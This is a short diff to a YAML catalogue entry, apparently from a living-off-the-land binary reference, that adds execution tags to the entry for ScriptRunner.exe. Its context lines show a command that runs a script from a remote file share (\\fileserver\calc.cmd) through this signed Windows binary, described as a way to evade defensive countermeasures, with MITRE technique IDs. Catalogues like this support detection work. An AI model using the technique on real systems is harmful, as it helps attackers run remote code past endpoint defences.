@@ -11,6 +11,8 @@ Commands:
     Privileges: User
     MitreID: T1202
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: EXE
   - Command: ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"
     Description: Executes calc.cmd from remote server
     Usecase: Execute binary through proxy binary from external server to evade defensive counter measures
@@ -18,6 +20,9 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: Remote
+      - Execute: CMD
 Full_Path:
   - Path: C:\Windows\System32\scriptrunner.exe
   - Path: C:\Windows\SysWOW64\scriptrunner.exe
